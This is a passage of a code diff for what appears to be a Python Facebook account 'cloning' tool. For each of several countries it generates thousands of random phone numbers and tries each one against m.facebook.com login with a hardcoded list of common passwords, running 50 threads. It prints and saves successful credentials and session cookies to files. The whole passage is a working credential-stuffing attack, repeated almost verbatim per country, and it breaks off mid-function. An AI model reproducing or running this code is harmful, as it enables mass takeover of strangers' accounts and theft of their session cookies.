+	limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m500,\x1b[38;5;208m1000,\033[0;92m2000,\033[0;93m3000,\x1b[38;5;208m5000,\033[0;92m10000,\033[0;93m20000,\x1b[38;5;208m30000,\033[0;92m50000,\033[0;93m100000,\x1b[38;5;208m1000000 ] \n\033[0;95m══════════════════════════════════════════════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	os.system("clear")
+	print(logo53)
+	passx = 0
+	RdxID = []
+	print("")
+	for bilal in range(passx):
+		pww = input(f"[*] Enter Password {bilal+1} : ")
+		RdxID.append(pww)
+	with ThreadPool(max_workers=50) as manshera:
+		os.system("clear")
+		print(logo+logo10)
+		tl = str(len(user))
+		jalan('\033[1;97m====================================================')
+		jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
+		jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+		jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
+		jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
+		jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
+		jalan('\033[1;97m====================================================')
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mNAME           \033[1;34m: \033[0;97m"+name)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAGENTS          \033[1;34m: \033[0;34m"+str(len(ugen)))
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAuto Sim Code       \033[1;34m: \033[0;97m"+code)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mCountry Code       \033[1;34m: \033[0;97m"+k)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mSTART TIME     \033[1;34m: \033[0;97m{Da}/{Mo}/{Ya} ~  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+		print(f"\x1b[1;94m\x1b[1;92m═━═━═━═━═━━═━═━═\033[1;92m R\033[1;93mD\033[1;94mX\033[1;95m-7\033[1;96m6\033[1;95m\033[1;94m\033[1;96m\x1b[1;92m ═━═━═━═━═━━═━═━═\x1b[1;91m ●   ")
+		print ('')
+		for co in user:
+			uid = k+code+codex+co
+			pwx = [code+'1990',codex+'2000',code+codex,code+'123',code+'1234',code+'12345',code+co,codex+'123',codex+'1234',codex+'12345',code+co ,code+codex+co,codex+code+co,code+codex+co,code+co+co,'password','1234567890','Bangladesh','joy4567','angel123','1234987','mafkor','passwordki','rajarani','baburma','1234567','amirtumi','kisuinah','kisuina','shundori','janina','bolbona','shudhutumi','aminastik','iskonbangladesh','chottogram','sunnyleone','paglahawa','aimontumakedilam','babukhaiso','please','monster','playboy','Password','Freefire','FREEFIRE','Freefire123','freefire123','pubg1234','pubg123','Pubg1234','Pubgmobile','Pubg123','rokunmia','pubgmobile','khan123','rajonmia','siamhosen','akashnil','abujuber','shunabondhu','boshonto','australia','january','gazipur','mymensing','amarjan','valotheko','shonarbangla','Bangladesh','monvalonei','tumishuduamr','bongobondhu','janinah','tuipagol','bangladesh','I LOVE YOU','freefire','passwordnai','I  Love You','Iloveyou','iloveyou','i love you','octopus','joybangla','zr%Xd665a','RE9iKR=GG','RT@oAwy5t']
+			manshera.submit(rcrackx,uid,pwx,tl)
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('\x1b[1;94mCrack process has been completed')
+	print('\x1b[1;94mIDs saved in \033[0;92mⓇDX-OK-1.txt,\x1b[1;91mⓇDX-CP-1.txt')
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('')
+	print('')
+	print('\x1b[1;96mChose An Option')
+	print('\x1b[1;92m [1] Continue ')
+	print('\x1b[1;91m [0] Exit ')
+	now = input('\x1b[1;96mSelect :-')
+	if now=='1':
+		login()
+	elif now=='0':
+		exit()
+
+
+
+def rcrackx(uid,pwx,tl):
+	#print(user)
+	global loop
+	global cps
+	global oks
+	global proxy
 	try:
-		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-		k="+91"
-		os.system('clear')
-		print(logo)
-		print(logo10)
-		main()
-	except IOError:
-		print ("[!] File Not Found")
-		input("\n[ Back ]")
-		Rdx1x()
+		for ps in pwx:
+			pro = random.choice(ugen)
+			session = requests.Session()
+			free_fb = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":uid,
+			"pass":ps,
+			"login":"Log In"}
+			header_freefb = {"authority": 'mbasic.facebook.com',
+    "method": 'GET',
+    "scheme": 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AfenWrDJrg6bli4boZ0PkVBdHonIEbBOk-nUPN_lXmQACJRdEMH0WKUgR5wjxf2v3HVgphCTlJh0qLL4qII9KsXB1yNQu8nowexJyi_4mqpJkg&smuh=36411&lh=Ac-CgbcnzaD0nRh-mHA&wtsid=rdr_0adeBNCcgVOy0KeJ5&refid=8&ref_component=mbasic_footer&_rdr',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro}
+			lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[7:22]
+				print('\r\r\033[1;32m[ⓇDX-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎Ⓡ]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+				cek_apk(session,coki)
+				open('/sdcard/ⓇDX-OK-1.txt', 'a').write( uid+' | '+ps+'\n')
+				oks.append(cid)
+				break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[24:39]
+				#print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+				open('/sdcard/ⓇDX-CP-1.txt', 'a').write( uid+' | '+ps+' \n')
+				cps.append(cid)
+				break
+			else:
+				continue
+		loop+=1
+		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s]\033[1;92[OK:{xr}%s{x}]\033[1;91[CP:{xr}%s{x}]'%(H,loop,tl,len(oks),len(cps))),
+		sys.stdout.flush()
+	except:
+		pass
+
+
+
 
 def brazil():
+	user=[]
+	twf =[]
+	os.getuid
+	os.geteuid
+	os.system('clear')
+	print(logo1)
+	print("\033[1;92mWHAT IS YOUR NAME?")
+	name=input("\033[1;92mUSER NAME : \033[1;92m")
+	os.system('clear')
 	print(logo11)
-	print("\x1b[1;97m127, 179, 117, 853, 318, 219, 834, 186, 479, 113")
+	print("\x1b[1;97m15,21,31,14,41,12,43,99")
+	code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+	k="+55"
+	codex = ''.join(random.choice(string.digits) for _ in range(2))
+	os.system('clear')
+	print(logo36)
+	limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m500,\x1b[38;5;208m1000,\033[0;92m2000,\033[0;93m3000,\x1b[38;5;208m5000,\033[0;92m10000,\033[0;93m20000,\x1b[38;5;208m30000,\033[0;92m50000,\033[0;93m100000,\x1b[38;5;208m1000000 ] \n\033[0;95m══════════════════════════════════════════════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	os.system("clear")
+	print(logo53)
+	passx = 0
+	RdxID = []
+	print("")
+	for bilal in range(passx):
+		pww = input(f"[*] Enter Password {bilal+1} : ")
+		RdxID.append(pww)
+	with ThreadPool(max_workers=50) as manshera:
+		os.system("clear")
+		print(logo+logo11)
+		tl = str(len(user))
+		jalan('\033[1;97m====================================================')
+		jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
+		jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+		jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
+		jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
+		jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
+		jalan('\033[1;97m====================================================')
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mNAME           \033[1;34m: \033[0;97m"+name)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAGENTS          \033[1;34m: \033[0;34m"+str(len(ugen)))
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAuto Sim Code       \033[1;34m: \033[0;97m"+code)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mCountry Code       \033[1;34m: \033[0;97m"+k)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mSTART TIME     \033[1;34m: \033[0;97m{Da}/{Mo}/{Ya} ~  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+		print(f"\x1b[1;94m\x1b[1;92m═━═━═━═━═━━═━═━═\033[1;92m R\033[1;93mD\033[1;94mX\033[1;95m-7\033[1;96m6\033[1;95m\033[1;94m\033[1;96m\x1b[1;92m ═━═━═━═━═━━═━═━═\x1b[1;91m ●   ")
+		print ('')
+		for co in user:
+			uid = k+code+codex+co
+			pwx = [code+'1990',codex+'2000',code+codex,code+'123',code+'1234',code+'12345',code+co,codex+'123',codex+'1234',codex+'12345',code+co ,code+codex+co,codex+code+co,code+codex+co,code+co+co,'password','1234567890','Bangladesh','joy4567','angel123','1234987','mafkor','passwordki','rajarani','baburma','1234567','amirtumi','kisuinah','kisuina','shundori','janina','bolbona','shudhutumi','aminastik','iskonbangladesh','chottogram','sunnyleone','paglahawa','aimontumakedilam','babukhaiso','please','monster','playboy','Password','Freefire','FREEFIRE','Freefire123','freefire123','pubg1234','pubg123','Pubg1234','Pubgmobile','Pubg123','rokunmia','pubgmobile','khan123','rajonmia','siamhosen','akashnil','abujuber','shunabondhu','boshonto','australia','january','gazipur','mymensing','amarjan','valotheko','shonarbangla','Bangladesh','monvalonei','tumishuduamr','bongobondhu','janinah','tuipagol','bangladesh','I LOVE YOU','freefire','passwordnai','I  Love You','Iloveyou','iloveyou','i love you','octopus','joybangla','zr%Xd665a','RE9iKR=GG','RT@oAwy5t']
+			manshera.submit(rcrackx,uid,pwx,tl)
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('\x1b[1;94mCrack process has been completed')
+	print('\x1b[1;94mIDs saved in \033[0;92mⓇDX-OK-1.txt,\x1b[1;91mⓇDX-CP-1.txt')
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('')
+	print('')
+	print('\x1b[1;96mChose An Option')
+	print('\x1b[1;92m [1] Continue ')
+	print('\x1b[1;91m [0] Exit ')
+	now = input('\x1b[1;96mSelect :-')
+	if now=='1':
+		login()
+	elif now=='0':
+		exit()
+
+
+
+def rcrackx(uid,pwx,tl):
+	#print(user)
+	global loop
+	global cps
+	global oks
+	global proxy
 	try:
-		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-		k="+55"
-		os.system('clear')
-		print(logo)
-		print(logo11)
-		main()
-	except IOError:
-		print("[!] File Not Found")
-		input("\n[ Back ]")
-		Rdx1x()
+		for ps in pwx:
+			pro = random.choice(ugen)
+			session = requests.Session()
+			free_fb = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":uid,
+			"pass":ps,
+			"login":"Log In"}
+			header_freefb = {"authority": 'mbasic.facebook.com',
+    "method": 'GET',
+    "scheme": 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AfenWrDJrg6bli4boZ0PkVBdHonIEbBOk-nUPN_lXmQACJRdEMH0WKUgR5wjxf2v3HVgphCTlJh0qLL4qII9KsXB1yNQu8nowexJyi_4mqpJkg&smuh=36411&lh=Ac-CgbcnzaD0nRh-mHA&wtsid=rdr_0adeBNCcgVOy0KeJ5&refid=8&ref_component=mbasic_footer&_rdr',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro}
+			lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[7:22]
+				print('\r\r\033[1;32m[ⓇDX-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎Ⓡ]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+				cek_apk(session,coki)
+				open('/sdcard/ⓇDX-OK-1.txt', 'a').write( uid+' | '+ps+'\n')
+				oks.append(cid)
+				break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[24:39]
+				#print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+				open('/sdcard/ⓇDX-CP-1.txt', 'a').write( uid+' | '+ps+' \n')
+				cps.append(cid)
+				break
+			else:
+				continue
+		loop+=1
+		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s]\033[1;92[OK:{xr}%s{x}]\033[1;91[CP:{xr}%s{x}]'%(H,loop,tl,len(oks),len(cps))),
+		sys.stdout.flush()
+	except:
+		pass
+
+
+
 
 def japan():
+	user=[]
+	twf =[]
+	os.getuid
+	os.geteuid
+	os.system('clear')
+	print(logo1)
+	print("\033[1;92mWHAT IS YOUR NAME?")
+	name=input("\033[1;92mUSER NAME : \033[1;92m")
+	os.system('clear')
 	print(logo12)
-	print("\x1b[1;97m11, 12, 19, 16, 15, 13, 14, 18, 17")
-	try:
-		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-		k="+81"
-		os.system('clear')
-		print(logo)
-		print(logo12)
-		main()
-	except IOError:
-		print("[!] File Not Found")
-		input("\n[ Back ]")
-		Rdx1x()
+	print("\x1b[1;97m03,06,075,011, 082, 12, 19, 16, 15, 13, 14, 18, 17")
+	code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+	k="+81"
+	codex = ''.join(random.choice(string.digits) for _ in range(2))
+	os.system('clear')
+	print(logo36)
+	limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m500,\x1b[38;5;208m1000,\033[0;92m2000,\033[0;93m3000,\x1b[38;5;208m5000,\033[0;92m10000,\033[0;93m20000,\x1b[38;5;208m30000,\033[0;92m50000,\033[0;93m100000,\x1b[38;5;208m1000000 ] \n\033[0;95m══════════════════════════════════════════════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	os.system("clear")
+	print(logo53)
+	passx = 0
+	RdxID = []
+	print("")
+	for bilal in range(passx):
+		pww = input(f"[*] Enter Password {bilal+1} : ")
+		RdxID.append(pww)
+	with ThreadPool(max_workers=50) as manshera:
+		os.system("clear")
+		print(logo+logo12)
+		tl = str(len(user))
+		jalan('\033[1;97m====================================================')
+		jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
+		jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+		jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
+		jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
+		jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
+		jalan('\033[1;97m====================================================')
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mNAME           \033[1;34m: \033[0;97m"+name)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAGENTS          \033[1;34m: \033[0;34m"+str(len(ugen)))
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAuto Sim Code       \033[1;34m: \033[0;97m"+code)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mCountry Code       \033[1;34m: \033[0;97m"+k)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mSTART TIME     \033[1;34m: \033[0;97m{Da}/{Mo}/{Ya} ~  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+		print(f"\x1b[1;94m\x1b[1;92m═━═━═━═━═━━═━═━═\033[1;92m R\033[1;93mD\033[1;94mX\033[1;95m-7\033[1;96m6\033[1;95m\033[1;94m\033[1;96m\x1b[1;92m ═━═━═━═━═━━═━═━═\x1b[1;91m ●   ")
+		print ('')
+		for co in user:
+			uid = k+code+codex+co
+			pwx = [code+'1990',codex+'2000',code+codex,code+'123',code+'1234',code+'12345',code+co,codex+'123',codex+'1234',codex+'12345',code+co ,code+codex+co,codex+code+co,code+codex+co,code+co+co,'password','1234567890','Bangladesh','joy4567','angel123','1234987','mafkor','passwordki','rajarani','baburma','1234567','amirtumi','kisuinah','kisuina','shundori','janina','bolbona','shudhutumi','aminastik','iskonbangladesh','chottogram','sunnyleone','paglahawa','aimontumakedilam','babukhaiso','please','monster','playboy','Password','Freefire','FREEFIRE','Freefire123','freefire123','pubg1234','pubg123','Pubg1234','Pubgmobile','Pubg123','rokunmia','pubgmobile','khan123','rajonmia','siamhosen','akashnil','abujuber','shunabondhu','boshonto','australia','january','gazipur','mymensing','amarjan','valotheko','shonarbangla','Bangladesh','monvalonei','tumishuduamr','bongobondhu','janinah','tuipagol','bangladesh','I LOVE YOU','freefire','passwordnai','I  Love You','Iloveyou','iloveyou','i love you','octopus','joybangla','zr%Xd665a','RE9iKR=GG','RT@oAwy5t']
+			manshera.submit(rcrackx,uid,pwx,tl)
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('\x1b[1;94mCrack process has been completed')
+	print('\x1b[1;94mIDs saved in \033[0;92mⓇDX-OK-1.txt,\x1b[1;91mⓇDX-CP-1.txt')
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('')
+	print('')
+	print('\x1b[1;96mChose An Option')
+	print('\x1b[1;92m [1] Continue ')
+	print('\x1b[1;91m [0] Exit ')
+	now = input('\x1b[1;96mSelect :-')
+	if now=='1':
+		login()
+	elif now=='0':
+		exit()
 
-def korea():
+
+
+def rcrackx(uid,pwx,tl):
+	#print(user)
+	global loop
+	global cps
+	global oks
+	global proxy
+	try:
+		for ps in pwx:
+			pro = random.choice(ugen)
+			session = requests.Session()
+			free_fb = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":uid,
+			"pass":ps,
+			"login":"Log In"}
+			header_freefb = {"authority": 'mbasic.facebook.com',
+    "method": 'GET',
+    "scheme": 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AfenWrDJrg6bli4boZ0PkVBdHonIEbBOk-nUPN_lXmQACJRdEMH0WKUgR5wjxf2v3HVgphCTlJh0qLL4qII9KsXB1yNQu8nowexJyi_4mqpJkg&smuh=36411&lh=Ac-CgbcnzaD0nRh-mHA&wtsid=rdr_0adeBNCcgVOy0KeJ5&refid=8&ref_component=mbasic_footer&_rdr',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro}
+			lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[7:22]
+				print('\r\r\033[1;32m[ⓇDX-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎Ⓡ]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+				cek_apk(session,coki)
+				open('/sdcard/ⓇDX-OK-1.txt', 'a').write( uid+' | '+ps+'\n')
+				oks.append(cid)
+				break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[24:39]
+				#print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+				open('/sdcard/ⓇDX-CP-1.txt', 'a').write( uid+' | '+ps+' \n')
+				cps.append(cid)
+				break
+			else:
+				continue
+		loop+=1
+		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s]\033[1;92[OK:{xr}%s{x}]\033[1;91[CP:{xr}%s{x}]'%(H,loop,tl,len(oks),len(cps))),
+		sys.stdout.flush()
+	except:
+		pass
+
+
+
+
+def nkorea():
+	user=[]
+	twf =[]
+	os.getuid
+	os.geteuid
+	os.system('clear')
+	print(logo1)
+	print("\033[1;92mWHAT IS YOUR NAME?")
+	name=input("\033[1;92mUSER NAME : \033[1;92m")
+	os.system('clear')
+	print(logo13)
+	print("\x1b[1;97m0191, 0192, 0193, 0194, 0195, 6, 7, 8, 9")
+	code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+	k="+850"
+	codex = ''.join(random.choice(string.digits) for _ in range(2))
+	os.system('clear')
+	print(logo36)
+	limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m500,\x1b[38;5;208m1000,\033[0;92m2000,\033[0;93m3000,\x1b[38;5;208m5000,\033[0;92m10000,\033[0;93m20000,\x1b[38;5;208m30000,\033[0;92m50000,\033[0;93m100000,\x1b[38;5;208m1000000 ] \n\033[0;95m══════════════════════════════════════════════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	os.system("clear")
+	print(logo53)
+	passx = 0
+	RdxID = []
+	print("")
+	for bilal in range(passx):
+		pww = input(f"[*] Enter Password {bilal+1} : ")
+		RdxID.append(pww)
+	with ThreadPool(max_workers=50) as manshera:
+		os.system("clear")
+		print(logo+logo13)
+		tl = str(len(user))
+		jalan('\033[1;97m====================================================')
+		jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
+		jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+		jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
+		jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
+		jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
+		jalan('\033[1;97m====================================================')
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mNAME           \033[1;34m: \033[0;97m"+name)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAGENTS          \033[1;34m: \033[0;34m"+str(len(ugen)))
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAuto Sim Code       \033[1;34m: \033[0;97m"+code)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mCountry Code       \033[1;34m: \033[0;97m"+k)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mSTART TIME     \033[1;34m: \033[0;97m{Da}/{Mo}/{Ya} ~  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+		print(f"\x1b[1;94m\x1b[1;92m═━═━═━═━═━━═━═━═\033[1;92m R\033[1;93mD\033[1;94mX\033[1;95m-7\033[1;96m6\033[1;95m\033[1;94m\033[1;96m\x1b[1;92m ═━═━═━═━═━━═━═━═\x1b[1;91m ●   ")
+		print ('')
+		for co in user:
+			uid = k+code+codex+co
+			pwx = [code+'1990',codex+'2000',code+codex,code+'123',code+'1234',code+'12345',code+co,codex+'123',codex+'1234',codex+'12345',code+co ,code+codex+co,codex+code+co,code+codex+co,code+co+co,'password','1234567890','Bangladesh','joy4567','angel123','1234987','mafkor','passwordki','rajarani','baburma','1234567','amirtumi','kisuinah','kisuina','shundori','janina','bolbona','shudhutumi','aminastik','iskonbangladesh','chottogram','sunnyleone','paglahawa','aimontumakedilam','babukhaiso','please','monster','playboy','Password','Freefire','FREEFIRE','Freefire123','freefire123','pubg1234','pubg123','Pubg1234','Pubgmobile','Pubg123','rokunmia','pubgmobile','khan123','rajonmia','siamhosen','akashnil','abujuber','shunabondhu','boshonto','australia','january','gazipur','mymensing','amarjan','valotheko','shonarbangla','Bangladesh','monvalonei','tumishuduamr','bongobondhu','janinah','tuipagol','bangladesh','I LOVE YOU','freefire','passwordnai','I  Love You','Iloveyou','iloveyou','i love you','octopus','joybangla','zr%Xd665a','RE9iKR=GG','RT@oAwy5t']
+			manshera.submit(rcrackx,uid,pwx,tl)
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('\x1b[1;94mCrack process has been completed')
+	print('\x1b[1;94mIDs saved in \033[0;92mⓇDX-OK-1.txt,\x1b[1;91mⓇDX-CP-1.txt')
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('')
+	print('')
+	print('\x1b[1;96mChose An Option')
+	print('\x1b[1;92m [1] Continue ')
+	print('\x1b[1;91m [0] Exit ')
+	now = input('\x1b[1;96mSelect :-')
+	if now=='1':
+		login()
+	elif now=='0':
+		exit()
+
+
+
+def rcrackx(uid,pwx,tl):
+	#print(user)
+	global loop
+	global cps
+	global oks
+	global proxy
+	try:
+		for ps in pwx:
+			pro = random.choice(ugen)
+			session = requests.Session()
+			free_fb = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
